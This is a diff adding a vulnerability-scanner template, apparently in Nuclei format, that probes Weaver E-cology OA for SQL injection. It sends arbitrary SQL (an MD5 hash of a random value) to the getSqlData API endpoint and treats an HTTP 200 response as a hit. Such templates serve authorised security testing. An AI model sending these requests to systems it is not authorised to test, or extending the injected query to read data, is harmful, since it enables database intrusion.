@@ -1,0 +1,27 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-sql_injection-CT-442574
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Sql_Injection Ct 442574
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-sql_injection-CT-442574'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand1}}')),3,32)
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand2}}')),3,32)
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
